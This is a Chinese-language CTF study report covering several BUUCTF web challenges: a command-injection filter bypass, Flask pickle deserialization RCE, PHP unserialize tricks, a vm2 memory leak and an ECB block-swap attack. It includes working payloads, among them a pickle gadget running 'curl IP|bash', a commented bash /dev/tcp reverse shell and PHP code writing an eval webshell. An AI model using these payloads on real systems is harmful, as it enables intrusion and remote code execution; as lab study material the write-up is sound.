# Nepnep学习报告 web第五周

- BUU 题目复现
- php 反序列化学习
- 代码审计 

## EasyBypass

源码

```php
<?php
highlight_file(__FILE__);

$comm1 = $_GET['comm1'];
$comm2 = $_GET['comm2'];

if(preg_match("/\'|\`|\\|\*|\n|\t|\xA0|\r|\{|\}|\(|\)|<|\&[^\d]|@|\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is", $comm1))
    $comm1 = "";
if(preg_match("/\'|\"|;|,|\`|\*|\\|\n|\t|\r|\xA0|\{|\}|\(|\)|<|\&[^\d]|@|\||ls|\||tail|more|cat|string|bin|less||tac|sh|flag|find|grep|echo|w/is", $comm2))
    $comm2 = "";

$flag = "#flag in /flag";

$comm1 = '"' . $comm1 . '"';
$comm2 = '"' . $comm2 . '"';

$cmd = "file $comm1 $comm2";
system($cmd);
?>
```

本地测一下, 主要是网上还有一个正则解析, 第一个基本没过滤, 第二个根本没法用, file就是一个幌子可以直接分号(`;`)闭合掉, 然后就是闭合下面添加的双引号, 发现 windows 和 linux 判断不一样, 但是linux如下是可以闭合的

```
?comm1=index.php";dir /;"&comm2=
```

最后一步禁用了 flag 标志, 用赋值的方式绕过, 或者 ? 代替

```
?comm1=index.php";a=g;tac /fla$a;"&comm2=
?comm1=index.php";tac /fla?;"&comm2=
```

## [HFCTF 2021 Final]easyflask

给了源码

```
file?file=/app/source
file?file=/proc/self/environ
secret_key=glzjin22948575858jfjfjufirijidjitg3uiiuuh
```

发现核心就是 pickle 反序列化, 知道secret_key之后就可以污染session, 然后 pickle 反序列化RCE

```python
# -*-coding:utf-8-*-
import pickle
from base64 import b64encode
import os

User = type('User', (object,), {
    'uname': 'ricky',
    'is_admin': 0,
    '__repr__': lambda o: o.uname,
    # 添加__reduce__方法RCE
    # '__reduce__': lambda o: (os.system, ("bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'",))
    '__reduce__': lambda o: (os.system, ("curl IP|bash",))

})
u = pickle.dumps(User())
print(b64encode(u).decode())
```

伪造session格式: {'u':{'b':'base64字符串'}}, 服务器监听即可

### 坑点

> 1. 正常来说不进行base64加密，直接将`{'u':b'dumps结果'}`生成session也可以RCE，这是因为代码方面他只是检查了u是否是dict，无论是不是字典都会进行loads操作，所以直接传序列化字符串也可以。不过这只适用于一些简单的命令，比如ls之类的，反弹shell的命令由于字符过于复杂，所以只能使用base64加密的字典格式。 
>
> 2. 靶机是Linux环境，本地是Windows环境，这两个环境下dumps的结果中序列化字符串声明系统的标识符不同：Linux=>posix；Windows=>nt，需要将脚本放在Linux环境下生成序列化字符串 

## easy_unserialize

源码

```php
class main{
    public $settings;
    public $params;

    public function __construct(){
        $this->settings=array(
            'display_errors'=>'On',
            'allow_url_fopen'=>'On'
                    );
    }
    $this->params = array();
    public function __wakeup(){
        foreach ($this->settings as $key => $value) {
            ini_set($key, $value);
        }
    }

    public function __destruct(){
        file_put_contents('settings.inc', unserialize($this->params));
    }
}
```

考了一个 php 反序列化的小 tirck

> **spl_autoload**  
>
> 它可以接收两个参数，第一个参数是$class_name，表示类名，第二个参数$file_extensions是可选的，表示类文件的扩展名,如果不指定的话，它将使用默认的扩展名.inc或.php 
>
> 通过spl_autoload来自动加载未定义的类settings，会默认加载当前目录下，以settings类名为文件名，php或者inc为后缀的文件

因为`__wakeup`读取的是数组, 先数组反序列化写🐎, 然后加载一个空类 settings 使其以 php 形式调用 settings.inc 里面的写🐎语句, 建立 exp.php 如下:

```php
<?php
class settings {

}

//highlight_file(__FILE__);
class main{
    public $settings;
    public $params;

    public function __construct(){
        $this->settings=array(
            'display_errors'=>'On',
            'allow_url_fopen'=>'On',
            'unserialize_callback_func'=>'spl_autoload'
        );
        $this->params = serialize(new settings());
/*        $this->params=serialize(array("<?php file_put_contents('ricky.php', '<?php eval(\$_POST[1]);?>');"));*/
    }
}

$a = new main();
echo urlencode(serialize($a));
```

访问根目录 `cat /flag_is_here`

### 非预期 trick

exp.php

```php
<?php
class A{
}
class main{
    public $settings;
    public $params;

    public function __construct(){
        $this->settings=array(
        'error_log'=>'yu.php',
        'unserialize_callback_func'=>'<?php system("cat /f*");?>',
        'html_errors'=>false
        );
        $this->params=serialize(new A());      
    }
}
$a=new main();
echo serialize($a);
```

原因

```
ini_set('error_log','yu.php');
 错误日志写入的文件名

ini_set('unserialize_callback_func','mycallback');
当反序列化后，PHP会寻找mycallback这个方法来include这个类文件，如果没定义这个方法则报错。

ini_set('html_errors',false);
不加这个的话，错误日志内容会html编码。
```

首先通过error_log生成php文件, 然后就是怎么把想执行的命令在报错中显示, 用到了 **unserialize_callback_func, 只要值是没有定义的方法, 就会把这个方法在报错中显示出来**

**unserialize_callback_func 还有一个功能, 就是可以执行函数, 函数的参数是反序列化的类名** 

```php
<?php
class main{
    public $settings;
    public $params;

    public function __construct(){
        $this->settings=array(
        'unserialize_callback_func'=>'system',
        );
        $this->params='O:2:"ls":0:{}';      
    }
}
$a=new main();
echo serialize($a);
```

这样其实是可以执行`system('ls')`的，但是类名只能有_（下划线）一个特殊符号, 无法读取文件

## [HITCON2016]Leaking

源码

```js
"use strict";
var randomstring = require("randomstring");
var express = require("express");
var {
    VM
} = require("vm2");
var fs = require("fs");
var app = express();
var flag = require("./config.js").flag
app.get("/", function(req, res) {
    res.header("Content-Type", "text/plain");
    /*    Orange is so kind so he put the flag here. But if you can guess correctly :P    */
    eval("var flag_" + randomstring.generate(64) + " = \"hitcon{" + flag + "}\";")
    if (req.query.data && req.query.data.length <= 12) {
        var vm = new VM({
            timeout: 1000
        });
        console.log(req.query.data);
        res.send("eval ->" + vm.run(req.query.data));
    } else {
        res.send(fs.readFileSync(__filename).toString());
    }
});
app.listen(3000, function() {
    console.log("listening on port 3000!");
});
```

首先定义变量flag，然后我们可以在沙箱里面执行任意的命令, 要get传递一个data参数，将它放在vm2创建的沙盒中运行，并且对传入的参数长度进行了限制，不超过12，这里可以用数组绕过, 那我们如何逃逸出去呢?

> 在较早一点的 node 版本中 (8.0 之前)，当 Buffer 的构造函数传入数字时, 会得到与数字长度一致的一个 Buffer，并且这个 Buffer 是未清零的。8.0 之后的版本可以通过另一个函数 Buffer.allocUnsafe(size) 来获得未清空的内存。低版本的node可以使用buffer()来查看内存，只要调用过的变量，都会存在内存中，那么我们可以构造paylaod读取内存

payload 1

```
?data[]=for (var step = 0; step < 100000; step++) {var buf = (new Buffer(100)).toString('ascii');if (buf.indexOf("hitcon{") !== -1) {break;}}buf;
```

超时了, 那我们直接通过Buffer()查看内存

```
?data=Buffer(500)
```

使用脚本查看

```python
import re
import requests
import time

url = "http://cb7f0286-649e-487a-945a-133669871e43.node3.buuoj.cn/?data=Buffer(500)"
while True:
  res = requests.get(url=url).text
  time.sleep(0.1)
  if 'flag{' in res:
    print(res)
    break
```

然后在里面找到 flag

## [BSidesCF2019]Mixer

ECB加密构造

本题输入得到如下的格式, 把它16位一组分割

```
{"first_name":"a
1.00000000000000
","last_name":"1
111","is_admin":
0}
```

得到的user是

```
fd91f5a0f503b2c35a7666a68d1d6bdc
4d01fcd1cac5e16f360015d161d0e909
66a7d78f6ac9954c53482a82ac880c62
697f6f5ba172c21afe9f9f608b70f31f
4ecc22edc3e128fba34ed70ee1c90390
```

然后每16位加密为32位, 相互独立, 把第二行插入第五行

```
fd91f5a0f503b2c35a7666a68d1d6bdc4d01fcd1cac5e16f360015d161d0e90966a7d78f6ac9954c53482a82ac880c62697f6f5ba172c21afe9f9f608b70f31f4d01fcd1cac5e16f360015d161d0e9094ecc22edc3e128fba34ed70ee1c90390
```

构造出的user实际为

```
{"first_name":"a
1.00000000000000
","last_name":"1
111","is_admin":
1.00000000000000
0}
```

然后就可以绕过 `is_admin` 的限制

## 总结

- python pickle 反序列化在windows和linux下的区别
- php 一些特定参数加载对反序列化的影响
- node 内存泄漏
- ECB加密的方式